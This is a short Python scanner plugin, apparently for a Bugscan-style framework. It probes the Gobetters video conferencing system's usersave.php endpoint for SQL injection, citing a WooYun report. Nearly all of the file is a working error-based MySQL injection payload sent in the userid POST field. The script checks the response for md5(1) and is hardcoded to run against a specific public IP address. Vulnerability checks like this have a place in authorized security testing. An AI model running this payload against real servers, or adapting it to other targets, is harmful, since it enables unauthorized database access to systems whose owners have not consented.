#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:Gobetters视频会议系统post注入再来一枚
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0134733


def assign(service,arg):
    if service=="gobetter":
        return True,arg 


def  audit(arg):
    url=arg+"web/users/usersave.php"
    post="from=123&deptid=0&deptname=123&userid=30001%20OR%20ROW(1355,6771)>(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20(SELECT%208443%20UNION%20SELECT%205201%20UNION%20SELECT%203389%20UNION%20SELECT%202860)a%20GROUP%20BY%20x)&level=123&username=admin&realname=admin&userpass=admin&sex=1&sex=1&email=%40&mobile=123&telephone=123&roleid=0%20"
 
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('gobetter','http://218.89.3.21:89/')[1])